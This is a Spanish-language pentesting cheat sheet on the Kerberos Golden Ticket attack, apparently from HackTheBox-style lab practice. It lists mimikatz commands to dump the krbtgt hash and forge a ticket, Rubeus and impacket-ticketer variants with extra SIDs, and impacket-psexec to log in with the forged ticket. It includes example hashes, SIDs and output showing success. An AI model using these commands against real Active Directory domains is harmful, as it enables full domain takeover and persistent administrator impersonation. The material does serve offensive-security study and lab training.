# Golden Ticket Attack

- Cuando comprometemos la cuenta krbtgt, ya owneamos el dominio.
- Podemos solicitar acceso a cualquier recurso o sistema dentro del dominio.
- Golden tickets == Completar acceso a cualquier maquina.

## Mimikatz
- `privilege::debug`
- `lsadump::lsa /inject /name:krbtgt`
- Ahora generamos el golden ticket:
    - `kerberos::golden /User:Administrator /domain:DOMAIN.local /sid:SID /krbtgt:NTLM /id:500 /ptt`
    - el `/id:500` significa el RID de administrador de maximos privilegios.
- `misc::cmd` para abrir un command prompt privilegiado

### Ejemplo mimikatz

```
kerberos::golden /user:administrator /domain:painters.htb /sid:S-1-5-21-1470357062-2280927533-300823338 /krbtgt:4b6af2bf64714682eeef64f516a08949 /sids:S-1-5-21-2734290894-461713716-141835440-4601 /ptt
mimikatz # User      : administrator
Domain    : painters.htb (PAINTERS)
SID       : S-1-5-21-1470357062-2280927533-300823338
User Id   : 500
Groups Id : *513 512 520 518 519 
Extra SIDs: S-1-5-21-2734290894-461713716-141835440-4601 ; 
ServiceKey: 4b6af2bf64714682eeef64f516a08949 - rc4_hmac_nt      
Lifetime  : 06/03/2025 13:59:25 ; 04/03/2035 13:59:25 ; 04/03/2035 13:59:25
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'administrator @ painters.htb' successfully submitted for current session

```

## Rubeus
- `.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt`

## Golden ticket con impacket
- `impacket-ticketer -nthash NT-HASH -domain DOMAIN.LOCAL -domain-sid DOMAIN-SID -extra-sid EXTRA-SID hacker`
- Exportamos la variable del ticket kerberos: `export KRB5CCNAME=hacker.ccache`
- Utilizamos psexec de impacket para entrar con este ticket `impacket-psexec DOMAIN.LOCAL/hacker@DC01.DOMAIN.LOCAL -k -no-pass -target-ip DC-IP`

### Ejemplo:
- `impacket-ticketer -nthash 4b6af2bf64714682eeef64f516a08949 -domain-sid S-1-5-21-1470357062-2280927533-300823338 -domain PAINTERS.HTB administrator`
- `ls administrator.ccache`
- `export KRB5CCNAME=administrator.ccache`

```
└─$ klist                         
Ticket cache: FILE:administrator.ccache
Default principal: administrator@PAINTERS.HTB

Valid starting       Expires              Service principal
03/06/2025 09:34:13  03/04/2035 09:34:13  krbtgt/PAINTERS.HTB@PAINTERS.HTB
	renew until 03/04/2035 09:34:13
```